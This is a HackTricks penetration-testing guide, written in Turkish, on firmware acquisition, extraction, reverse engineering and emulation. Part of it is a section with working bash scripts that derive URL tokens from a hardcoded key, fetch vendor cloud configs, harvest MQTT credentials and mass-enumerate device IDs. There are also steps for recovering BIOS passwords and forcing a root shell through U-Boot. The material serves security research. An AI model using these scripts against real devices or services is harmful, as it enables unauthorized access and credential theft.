# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sistemini başlatabilir. Firmware'i incelemek ve gerektiğinde değiştirmek, güvenlik açıklarını belirlemede kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamanın kritik ilk adımıdır. Bu süreç aşağıdakilere ilişkin verilerin toplanmasını içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader özellikleri
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları çok değerlidir. Ayrıca mevcut açık kaynaklı yazılım bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz sunar.

## **Firmware'i Edinme**

Firmware çeşitli yollarla edinilebilir; her yöntemin karmaşıklık düzeyi farklıdır:

- Doğrudan kaynaktan (geliştiriciler, üreticiler)
- Sağlanan talimatları izleyerek **derleyerek**
- Resmî destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişerek
- Man-in-the-middle teknikleriyle **güncellemeleri** yakalayarak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkararak**
- Cihaz iletişimindeki güncelleme isteklerini **dinleyerek**
- **Sabit kodlanmış güncelleme uç noktalarını** belirleyip kullanarak
- Bootloader'dan veya ağ üzerinden **dump alarak**
- Diğer tüm yöntemler başarısız olursa uygun donanım araçlarını kullanarak depolama yongasını **çıkarıp okuyarak**

### Yalnızca UART günlükleri: Flash'teki U-Boot env üzerinden root shell zorlamak

UART RX yoksayılıyorsa (yalnızca günlükler alınıyorsa), U-Boot ortam blob'unu çevrimdışı **düzenleyerek** yine de bir init shell zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SPI flash'ten bir SOIC-8 klipsi ve programlayıcıyla dump alın (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve **blob için U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash’layıp cihazı yeniden başlatın; UART üzerinden bir shell açılmalıdır.

Bu yöntem, bootloader shell’i devre dışı bırakılmış ancak env bölümüne harici flash erişimiyle yazılabilen gömülü cihazlarda kullanışlıdır.

## Firmware’i analiz etme

Artık **firmware’e sahip olduğunuza göre**, nasıl işlem yapacağınızı belirlemek için firmware’den bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile imajın **entropisini** kontrol edin. Entropi düşükse imajın şifrelenmiş olması olası değildir. Entropi yüksekse şifrelenmiş (veya bir şekilde sıkıştırılmış) olması olasıdır.

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanabilirsiniz.

### Differential flash analizi ve kurtarılabilir XOR secret store'ları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa, önce eşleşen flash okumalarından birkaç tane alın, **tam olarak tek** bir ayarı değiştirin, çipin tamamını yeniden dump edin ve offset'leri karşılaştırın. Deneyi kontrollü değerlerle tekrarlamak, ayardaki değişiklikleri sayaçlardan ve yazma metadata'sından ayırt etmeye yardımcı olur; verilerin yerinde değiştirilmesi yerine yeni offset'lerde değişiklik görülmesi, yalnızca ekleme yapan veya log-structured bir depolama alanına işaret eder. Silinmiş/tombstone olarak işaretlenmiş girdileri saklayın; payload baytları hâlâ kurtarılabilir olabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra, `binwalk` gibi araçlarla firmware modüllerini çıkarın ve writer/validator'ı Ghidra'da reverse edin. Alan sınırlarını, padding'i, key indexing'i ve key derivation'ı yalnızca ciphertext örüntülerinden çıkarsamak yerine kodda doğrulayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır padding'den key'leri kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen plaintext aynı offset'lerdeki keystream baytlarını ortaya çıkarır. Sıfır padding'i, tekrarlanan bir XOR key'inin tüm indekslerini kapsadığında sabit boyutlu bir alan özellikle açıktır: `0x00 XOR key_byte = key_byte` olduğundan, şifrelenmiş padding bu key baytlarını doğrudan ortaya çıkarır. Her key indeksi kapsanıyorsa key'i ciphertext'in sonundan yeniden oluşturun ve doldurulmuş baytların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in güvenlik açığı bulunan DVAR BIOS-parola biçimi somut bir örnektir: 32 baytlık alanın `0` numaralı baytı plaintext iken, `1..31` numaralı baytlar 20 baytlık tekrarlanan bir key kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Şifre uzunluğu `L` olduğunda, `L..31` konumları XOR işleminden önce sıfırdı. `L <= 12` olduğunda bu konumlar her anahtar indeksini kapsar; böylece brute force gerekmeden anahtarın ve parolanın tamamı elde edilir:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları elde etme

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: cihaz tohumu ve GUID sabittir; parolaya bağlı tek girdi, açık metindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olduğu ve aynı baytla başlayan kayıtların aynı anahtarı paylaştığı anlamına gelir. Etkin ve silinmiş kayıtları bu bayta göre gruplayın; kısa bir geçmiş kayıt, padding üzerinden tam anahtarı sızdırabilir ve kendi padding'i yetersiz olan daha uzun, güncel bir kaydın şifresini çözebilir. Bu nedenle eski şifreli metinler silinmek yerine tombstone olarak işaretlendiğinde parola rotasyonu maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve saklanan ham/anahtar baytlarını görüntüleyebilir. Aracı bir checkout'tan derleyin ve doğrulanmış bir flash imajını şu şekilde tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'larda record structure, yazdırılabilir karakter kısıtlamaları, sıfır padding kontrolleri, key entropy ve anahtarın döngü yaptığı yerlerdeki tutarlılıkla false positive'leri reddedin. Tekrarlanan dump'lar, yazma başına seyrek bit flip'leri gösteriyorsa gözlemlenen maskeleri listeleyin ve bu kısıtlamaları kullanarak düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma gibi sunmak yerine belirsiz karakterleri bildirin.<sup>[[12]](#references)</sup>

Password verifier'lar, geri döndürülebilir ciphertext yerine salt eklenmiş, yinelemeli bir one-way hash saklamalıdır; log-structured depolar ise geçersiz kılınmış gizli materyali güvenli biçimde silmelidir.<sup>[[12]](#references)</sup>

### Dosya Sistemini Alma

Önceki yorumlu araçlarla `binwalk -ev <bin>` gibi komutları kullanarak **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini **dosya sistemi türünün adını taşıyan bir klasörün** içine çıkarır. Bu adlar genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, dosya sisteminin magic byte'ını imzalarında **bulundurmaz**. Bu durumlarda, dosya sisteminin offset'ini bulmak ve sıkıştırılmış dosya sistemini binary'den carve etmek için binwalk kullanın; ardından aşağıdaki adımlarla dosya sistemini türüne göre **manuel olarak çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd command** komutunu çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş gömülü kök dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor ancak meta veri ofsetleri nominal bölümün ötesine uzanıyorsa, hemen bozuk olarak sınıflandırmayın. Gömülü önyükleme kodu, Device Mapper ile gerçek kök aygıtı birden fazla fiziksel aralıktan oluşturabilir; bu nedenle tek bir GPT bölümünden veri ayıklamak yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Medya imajının tamamını inceleyin

Öncelikle edinimin tamamlandığını, boyutun sabit kaldığını ve imajı hâlâ hiçbir yazma işleminin kullanmadığını doğrulayın. Dosya adı bir başlangıç/bitiş adresi içeriyorsa bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT'yi salt okunur modda kurtarın ve yalnızca gerekli aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel birimde `vgchange -ay` komutunu çalıştırmayın; çünkü birim grubu çakışmaları ve istenmeyen yazma işlemleri mümkündür.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Özgün init mantığının veya bir LVM yığınının imajın tamamını görmesi gerekiyorsa kullan-at bir VM tercih edin. Standart bir boot partition'dan alınan geçmiş boot logları özellikle yararlıdır: bootloader; proprietary container ofsetlerini, bileşen uzunluklarını, slot seçimini, hizalama kurallarını ve imza doğrulamasını kaydetmiş olabilir. Bu değerleri kullanarak gömülü bir komut satırını/kernel'ı/initramfs'i ayıklayın; ardından her çıktıyı `file`, magic byte'lar ve `binwalk` ile bağımsız olarak doğrulayın. Container sonuna kadar okumak, kernel'a yanlışlıkla bir initrd, ACPI nesnesi veya imza eklenmesine neden olabilir.<sup>[[9]](#references)</sup>

#### Boot-time blok eşlemesini kurtarın

Kernel'ın initramfs'ini çıkarın ve `/init` ile depolama kitaplıklarını tersine mühendislikle inceleyin. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) içinde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve partition yollarına yönelik string referanslarını izleyin; ardından etkin A/B slotunu seçen ve tabloyu oluşturan kodun izini sürün. radare2 için yararlı başlangıç noktaları `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx` komutlarıdır.<sup>[[9]](#references)</sup>

linear target, sanal bir cihazın ardışık aralıklarını bir veya daha fazla backing device üzerindeki aralıklara eşler. Kurtarılan iki segmentli bir tablo genellikle şu şekildedir (tüm konumlar ve uzunluklar 512 baytlık sektörler cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodundaki aritmetiği; tamsayı genişliği, kaydırmalar ve birim dönüşümleri dâhil olmak üzere, aynen yeniden üretin. Örneğin aşağıdaki ifade, bayt cinsinden boyutu önce 4-KiB sınırına aşağı yuvarlar, ancak bundan sonra 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen son kısmı `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tablodaki aralıkları, medya dökümünün tamamını belleğe yüklemek yerine tablo sırasına göre sınırlı parçalar halinde kopyalayarak düz bir analiz imajı oluşturun. Böylece host tarafında mapper aygıtları oluşturulması da önlenir. GPT'den elde edilen offset'leri, ters çevrilmiş sektör sayılarını ve ortaya çıkan çıktı uzunluğunu ayrı ayrı doğrulayın.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt etme

SquashFS için `unsquashfs` çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock'taki 40. offset'te bulunan little-endian 64 bit `bytes_used` alanını çözümleyin. Birbirinden bağımsız birkaç yapıda çıkarma işlemi başarısız olursa beklenen konumların çevresindeki geniş bir aralıkta arama yapın ve güçlü yapısal adaylar arayın: açılabilen bir metadata bloğu, art arda gelen birkaç geçerli dizin girdisi, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı imzalı fark, dizin metadata'sı ve verity kaydı gibi bağımsız yapıları geçerli hâle getiriyorsa, olası neden eksik baytlardan ziyade sistematik bir segment başlangıç hatasıdır. Yetim kurtarma veya dosya sistemi metadata'sını yamalama girişiminde bulunmadan önce, tersine çevrilmiş aritmetiğe dönüp atılmış kalanları, işaretliliği, taşmayı veya sektör/sayfa yuvarlamasını araştırın.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını ayrı tutun: TPM-sealed LUKS volume'lar veri gizliliğini korurken, imzalı bir dm-verity eşlemesi kök dosya sistemi bütünlüğünü korur. Bir yazılım TPM'si, orijinal fiziksel TPM'ye mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan, yalnızca araştırma amaçlı bir init üzerinden değiştirilmiş bir SquashFS'i başlatmak da imzasını taklit etmez veya dm-verity'yi bozmaz.<sup>[[9]](#references)</sup>

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware imajını analiz etmek ve içinden değerli veriler çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın ( `<bin>` olarak anılacaktır) ilk incelemesi için bir dizi komut sunulmuştur. Bu komutlar dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

İmajın şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropi** kontrol edilir. Düşük entropi şifreleme olmadığını, yüksek entropi ise olası şifreleme veya sıkıştırmayı gösterir.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** belgeleri ve dosyaları incelemeye yönelik **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` komutuyla dosya sistemi genellikle çıkarılabilir; çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic byte'ların eksikliği nedeniyle dosya sistemi türünü tanıyamadığında elle çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin ofseti bulunur, ardından `dd` komutuyla dosya sistemi ayrıştırılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Sonrasında, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan network daemon’larına, hardcoded kimlik bilgilerine, API endpoint’lerine, update server işlevlerine, derlenmemiş koda, başlangıç script’lerine ve çevrimdışı analiz için derlenmiş binary’lere dikkat edilir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Potansiyel güvenlik açıkları için yapılandırma ve script dosyaları
- Daha ayrıntılı analiz için gömülü binary’ler
- Yaygın IoT cihazı web sunucuları ve binary’leri

Dosya sistemi içindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan çeşitli araçlar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binary’lerde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kod hem de derlenmiş binary’ler güvenlik açıkları açısından incelenmelidir. Unix binary’leri için **checksec.sh** ve Windows binary’leri için **PESecurity** gibi araçlar, istismar edilebilecek korumasız binary’leri belirlemeye yardımcı olur.

## Türetilmiş URL token’ları aracılığıyla cloud yapılandırmasını ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub’ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud endpoint’inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında `<token>` değerinin, örneğin hardcoded bir secret kullanılarak device ID’den yerel olarak türetildiğini görebilirsiniz:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL’yi yeniden oluşturup cloud yapılandırmasını almasını sağlar; bu yapılandırma çoğu zaman plaintext MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulama adımları:

1) UART boot log’larından deviceId’yi çıkarın

- 3.3V UART adaptörünü (TX/RX/GND) bağlayın ve log’ları yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Örneğin, cloud config URL kalıbını ve broker adresini yazdıran satırları arayın:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY'i ve token algoritmasını kurtarma

- Binary dosyalarını Ghidra/radare2'ye yükleyin ve config path'i ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud yapılandırmasını ve MQTT kimlik bilgilerini toplayın

- URL'yi oluşturup curl ile JSON'u çekin; sırları çıkarmak için jq ile ayrıştırın:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Plaintext MQTT'yi ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir device ID'lerini listeleyin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, vendor OUI/product/type baytlarının ardından sıralı bir suffix kullanır.
- Aday ID'leri yineleyebilir, token'ları türetebilir ve config'leri programatik olarak çekebilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration girişiminde bulunmadan önce daima açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden sırları ortaya çıkarmak için emülasyonu veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir aygıtın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak kök dosya sistemini veya belirli ikili dosyaları, Raspberry Pi gibi mimarisi ve endianness değeri eşleşen bir aygıta ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha fazla test yapılmasını sağlayabilir.

### Tekil İkili Dosyaları Emüle Etme

Tek tek programları incelerken programın endianness değerini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisindeki bir ikili dosyayı emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips` kullanılır; little-endian ikili dosyalar içinse `qemu-mipsel` tercih edilir.

#### ARM Mimarisi Emülasyonu

ARM ikili dosyaları için süreç benzerdir; emülasyonda `qemu-arm` emülatörü kullanılır.

### Tam Sistem Emülasyonu

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, tam firmware emülasyonunu mümkün kılar; süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanmış kök dosya sistemlerini yeniden oluşturma

SquashFS superblock'u okunabilir durumdaysa ancak inode, dizin veya parça tablosu ofsetleri olanaksız görünüyorsa `unsquashfs`'i hemen yamalamayın. Erken başlatma ikili dosyasını tersine mühendislikle inceleyin ve oluşturduğu blok aygıtı grafiğini yeniden üretin: gömülü sistemler görünürde bir kök bölümü sunabilir, ancak gerçek dosya sistemini başka bir bölümden alınan sektörleri ekleyen bir `dm-linear` eşlemesiyle oluşturabilir. Superblock kontrolleri başarılı olsa bile, sonraki tüm meta veri bloklarının konumu kaymış olabilir.<sup>[[11]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların bayt, 512 baytlık sektör veya 4 KiB'lık sayfa cinsinden olup olmadığını belirleyin; kaydırma ve kesme işlemlerini özgün sıralarıyla yeniden üretin ve A/B düzenlerinde bankaya bağlı kuyruk bölgelerini hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce 4 KiB sınırına göre keser, ardından sonucu 512 baytlık sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen kapsamı birkaç kilobayt kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Kullanışlı bir doğrulama iş akışı şöyledir:<sup>[[11]](#references)</sup>

1. Doğrulayıcı/init ikili dosyasından her `dm-linear` segmentinin kaynak aygıtını, başlangıç sektörünü ve uzunluğunu belirleyin.
2. Hizalama kurallarını değiştirmeden kapsamları birleştirin veya eşleyin.
3. Çıkarma yine başarısız olursa, yalnızca tahmin edilen sınırın çevresindeki küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'u kabul etmek yerine art arda gelen birkaç geçerli meta veri yapısını şart koşun.
4. Yeniden oluşturulan imajda değiştirilmemiş bir `unsquashfs` çalıştırın; tüm dizinlerin ve parçaların başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analistin denetimindeki dm-verity değişimi

Analist QEMU kernel'ini, initramfs'i ve sanal diskleri denetliyorsa, satıcının doğrulama PID 1'i küçük, statik olarak bağlanmış bir init ile değiştirerek değiştirilmiş bir kök dosya sistemi başlatılabilir. Bu, bir **laboratuvar önyükleme zinciri ikamesidir**; dm-verity'nin, RSA imzasının, Secure Boot'un veya TPM ile mühürlenmiş bir anahtarın kırılması değildir.<sup>[[11]](#references)</sup>

Yeni init, özgün önyükleme yolunun işlevsel adımlarını yansıtmalıdır: `devtmpfs`'i bağlayın, `setsid()` çağırın, `/dev/console`'ı 0–2 dosya tanımlayıcılarına bağlayın, `/proc` ve `/sys`'yi bağlayın, sağlanan blok aygıtını bekleyin, düzenlenmiş kök dosya sistemini salt okunur olarak bağlayın, eski köke ait sözde dosya sistemlerini ayırın, yeni bağlamayı `/` üzerine taşıyın, `chroot` çalıştırın ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile başlatın. `/dev`, `/proc` ve `/sys`'yi `MS_MOVE` **öncesinde** ayırmak, yeni köke ait bağlama noktalarının yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir aygıt durumunu değiştirilmiş, salt okunur kök dosya sisteminden ayrı tutun. qcow2 katmanı özgün diskin LVM durumunu korurken ikinci, salt okunur bir virtio diski düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı imaj durumu hata ayıklama

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri hatayı gizlediğinde, kalıcı durumu guest dışında inceleyin. Çalışan bir VM’nin kullandığı overlay’i asla bağlamayın; imajı `qemu-nbd` ile erişime açın, LVM keşfini amaçlanan NBD bölümüne kısıtlayın ve bağlantıyı kesmeden önce volume group’u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
